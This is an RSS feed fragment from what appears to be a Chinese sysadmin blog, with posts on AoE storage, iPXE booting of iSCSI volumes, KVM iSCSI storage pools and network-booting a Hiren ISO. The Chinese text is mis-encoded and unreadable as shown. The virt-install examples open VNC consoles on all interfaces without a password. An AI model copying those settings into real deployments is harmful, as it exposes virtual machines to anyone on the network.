&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå‡†å¤‡å­˜å‚¨ç©ºé—´ï¼Œåƒlvã€rawæ–‡ä»¶ã€ç¡¬ç›˜(/dev/sdb)ã€ç¡¬ç›˜åˆ†åŒº(/dev/sdb1)æˆ–è€…raidç£ç›˜/dev/md0éƒ½å¯ä»¥ç”¨ä½œå‚¨å­˜ã€‚&lt;/p&gt;
&lt;p&gt;åšä¸€å—20Gçš„rawæ–‡ä»¶å­˜å‚¨ç©ºé—´ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /storage  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/storage/storage1.img &lt;span class=&#34;nv&#34;&gt;bs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1024k &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20000&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åšä¸€å—aoeç¡¬ç›˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vbladed &lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; eth0 /storage/storage1.img  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ vbladed åé¢è·Ÿäº†2ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸»åºåˆ—å·ï¼Œå¯ä»¥ä» 0-65535ï¼Œç¬¬äºŒä¸ªæ˜¯æ¬¡åºåˆ—å·ï¼Œå¯ä»¥ä»0-255ã€‚ç„¶åè·Ÿå‘å¸ƒçš„ç½‘å¡ï¼Œæœ€åæ˜¯å­˜å‚¨ç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;æœ€å¥½æŠŠvbladedæ”¾å…¥/etc/rc.d/rc.local&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/rc.local  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vbladed &lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; eth0 /storage/storage1.img  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼ŒæœåŠ¡å™¨ç«¯çš„å·¥ä½œå°±å®Œæˆäº†ï¼Œå¤§å®¶çœ‹åˆ°äº†ï¼ŒåŸºæœ¬ä»€ä¹ˆä¹Ÿæ²¡è®¾ï¼Œå› ä¸ºæ˜¯èµ°åœ¨äºŒå±‚ä¹ˆã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åipxeéƒ¨åˆ†å°±ç®€å•äº†ï¼Œä¾æ ·ç”»è‘«èŠ¦ä¿®æ”¹boot2.phpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\52:54:00:d9:fe:43&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set keep-san 1\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sanboot aoe:e65535.255\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æå®š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ipxeè¿œç¨‹å¯åŠ¨iscsiä¸Šé¢çš„å…‹éš†å·</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_iscsi/</link>
      <pubDate>Thu, 18 Jan 2024 17:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_iscsi/</guid>
      <description>&lt;p&gt;æŒ‰ä¸Šä¸€ç¯‡æ‰€è¯´ï¼Œæˆ‘ä»¬å·²ç»å¼„äº†ä¸ªiscsiä¸Šé¢çš„win7å·ï¼Œå…¶å®å°±æ˜¯æŠŠèåœèŠ±å›­çš„win7 cloneåˆ°äº†ä¸€ä¸ª10Gçš„æ–‡ä»¶å·ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;å¼•ç”³é—®é¢˜ï¼š å¤§å®¶å…¶å®å¯ä»¥ç”¨qcow2çš„æ–‡ä»¶æ ¼å¼ä¿å­˜çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;qemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/tgt/targets.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    backing-store /export/iscsi/disk03.img
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    backing-store /export/iscsi/windows7.qcow2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    write-cache off
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/target&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tgt-admin --execute  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•è®©ipxeç›´æ¥èµ·åŠ¨è¿™ä¸ªiscsiå·å‘¢ï¼Ÿ è¿˜æ˜¯ç¼–è¾‘boot2.phpå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\52:54:00:d9:fe:43&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„å•Šï¼ŒæŸ¥éå¾ˆå¤šç½‘ä¸Šèµ„æ–™ï¼š sanbootçš„å‚æ•°éƒ½æ˜¯iscsi:ip::::iqnï¼Œå®é™…æ— è®ºæ˜¯å®ä½“æœºçš„pxeï¼Œè¿˜æ˜¯kvmè™šæ‹Ÿæœºçš„pxeï¼Œéƒ½æ— æ³•å¯åŠ¨ã€‚ä»¥ä¸‹æ ¼å¼æ‰æ˜¯æ­£ç¡®çš„ï¼š
&lt;strong&gt;iscsi:ip::3260:1:iqn&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·è£…ä¸ªwin7å°±ç®€å•äº†ï¼Œæ‹·è´ä¸€ä¸‹disk03.imgè¿™ä¸ªæ¨¡æ¿ï¼Œå¯åŠ¨pxeå³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;virt-install &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pxe-16-11-8 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vcpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--nodisks &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--boot network &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-type&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;windows  &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-variant&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;win7 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5910&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥åå°±å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•ç¬é—´å¼„å‡ºä¸€å †winè™šæœºäº†ï¼Œç”¨å®Œå°±åˆ é™¤&lt;/p&gt;</description>
    </item>
    <item>
      <title>kvmä½¿ç”¨iscsiä½œä¸ºå­˜å‚¨æ± å®‰è£…win</title>
      <link>https://rendoumi.com/posts/20240118-kvm_iscsi/</link>
      <pubDate>Thu, 18 Jan 2024 16:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-kvm_iscsi/</guid>
      <description>&lt;p&gt;æœ€è¿‘éƒ½åœ¨ç ”ç©¶ipxeå’Œiscsiï¼Œé‚£ä¹ˆå¦‚ä½•è®©kvmä½¿ç”¨å­˜å‚¨åœ¨iscsiä¸Šé¢çš„æ–‡ä»¶å·å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬å·²ç»æŒ‰ä¹‹å‰çš„æ–‡ç« æ¶å¥½äº†iscsiï¼š&lt;/p&gt;
&lt;p&gt;é€ ä¸ª10Gæ–‡ä»¶:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/iscsi/disk03.img &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;seek&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10G  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœåŠ¡ç«¯å¢åŠ iscsi target&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/tgt/targets.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    backing-store /export/iscsi/disk03.img
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    write-cache off
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/target&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tgt-admin --execute  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;isciå‡†å¤‡å¥½äº†ï¼Œç„¶åæˆ‘ä»¬å»kvmå®šä¹‰æ± å­ï¼š&lt;strong&gt;myiscsi&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh# pool-start myiscsi  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name                 State      Autostart  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-----------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;myiscsi              active     no     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh# pool-autostart myiscsi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh &lt;span class=&#34;c1&#34;&gt;# pool-list  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name                 State      Autostart  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-----------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;myiscsi              active     yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh# vol-list myiscsi  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name                 Path  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-----------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unit:0:0:1           /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œè®°ä¸‹æ¥è¿™ä¸ªNameï¼š&lt;strong&gt;unit:0:0:1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬æ¥å®‰è£…winçš„kvmå§ï¼Œç›´æ¥cloneè¾“å‡ºåˆ°ç¡¬ç›˜&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-install &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iscsi-16-11-9 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vcpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--cdrom&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--boot network,cdrom,hd,menu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--disk &lt;span class=&#34;nv&#34;&gt;vol&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;myiscsi/unit:0:0:1 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-type&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;windows  &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-variant&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;win7 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5911&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢diskçš„å‚æ•°ï¼Œ&lt;strong&gt;myiscsi/unit:0:0:1&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>IPXEä¸‡èƒ½å·¥å…·hiren.isoçš„å¯åŠ¨æ–¹å¼</title>
      <link>https://rendoumi.com/posts/20240118-ipxe_hiren/</link>
      <pubDate>Thu, 18 Jan 2024 14:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-ipxe_hiren/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬å¸Œæœ›æœ‰ç´§æ€¥æƒ…å†µå‡ºç°çš„æ—¶å€™ï¼Œipxeå¯ä»¥ç”¨&lt;code&gt;systemrecuecd&lt;/code&gt;æ•‘æ€¥ï¼Œå¯èƒ½ä¹Ÿå¸Œæœ›æœºå™¨ä¸Šæ¶å‰æµ‹æµ‹å†…å­˜ã€åˆ†åŒºã€èµ·ä¸ªwinpeç­‰ç­‰ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°&lt;code&gt;hiren&lt;/code&gt;è¿™ä¸ªå·¥å…·äº†ï¼Œè¿™ä¸ªä¸œè¥¿å°±æ˜¯å›½å¤–çš„è€æ¯›æ¡ƒå·¥å…·ç®±ï¼&lt;/p&gt;
&lt;p&gt;å¾ˆç®€å•ï¼Œä¿®æ”¹boot2.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\52:54:00:a7:ef:5d&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;chain  http://172.16.8.1/ks/winpe/memdisk iso raw\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;memdiskä»syslinuxé‡Œé¢æ‹·è´å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±æœ‰ä¸€ä¸ªä¸‡ç”¨å·¥å…·å¯ç”¨äº†,isoå¯åŠ¨éƒ½å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹å¼å“¦ã€‚&lt;/p&gt;
